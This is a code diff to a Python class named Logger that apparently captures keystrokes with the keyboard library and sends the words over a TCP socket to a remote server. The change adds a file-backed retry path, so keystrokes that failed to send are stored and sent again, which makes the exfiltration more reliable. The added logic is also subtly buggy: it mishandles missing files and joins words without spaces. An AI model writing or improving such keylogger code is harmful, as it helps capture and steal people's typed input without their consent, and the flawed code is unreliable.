@@ -7,6 +7,7 @@ from random import choice
 from string import ascii_letters, ascii_uppercase
 from subprocess import PIPE, run
 from typing import Sequence
+import threading
 
 from keyboard import *
 
@@ -76,6 +77,17 @@ class Logger:
 		self.serving = True
 		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		self.filename = log_file
+		if not self.check_file_empty():
+			self.publish_from_file()
+
+	def check_file_empty(self) -> bool:
+		"""
+		Checks that the supplied filename is a valid file and it's size.
+
+		:return: Wether the file exists and is empty
+		:rtype: bool
+		"""
+		return path.isfile(self.filename) and path.getsize(self.filename) == 0
 
 	def init_conn(self) -> None:
 		"""
@@ -122,6 +134,10 @@ class Logger:
 			self.init_conn()
 		except ConnectionRefusedError:
 			return False
+
+		if not self.check_file_empty():
+			self.publish_from_file(True)
+
 		while self.output_queue.qsize():
 			current = self.output_queue.get() + " "
 			self.socket.send(current.encode(encoding="latin-1", errors="ignore"))
@@ -133,6 +149,38 @@ class Logger:
 				return False
 		self.socket.close()
 		return True
+
+	def publish_from_file(self, connected=False):
+		"""
+		If a previous publish attempt failed, the words to be sent were written to the file, so try to send them again.
+		"""
+
+		if not connected:
+			try:
+				self.init_conn()
+			except ConnectionRefusedError:
+				return
+
+		with open(self.filename, "r") as _:
+			# Read all the words that need to be sent
+			data = _.readlines()
+		failed = []
+
+		for line in data:
+			for word in line.split(" "):
+				self.socket.send(word.encode(encoding="latin-1", errors="ignore"))
+				try:
+					response = self.socket.recv(32)
+					if response != b"OK":
+						# Something went wrong, mark it as failed
+						failed.append(word)
+				except ConnectionAbortedError:
+					return
+
+		if failed:
+			# The failed list is not empty, some words couldn't be sent so write them back
+			with open(self.filename, "w") as _:
+				_.write(''.join(word for word in failed))
 
 	def handle_input(self) -> None:
 		"""
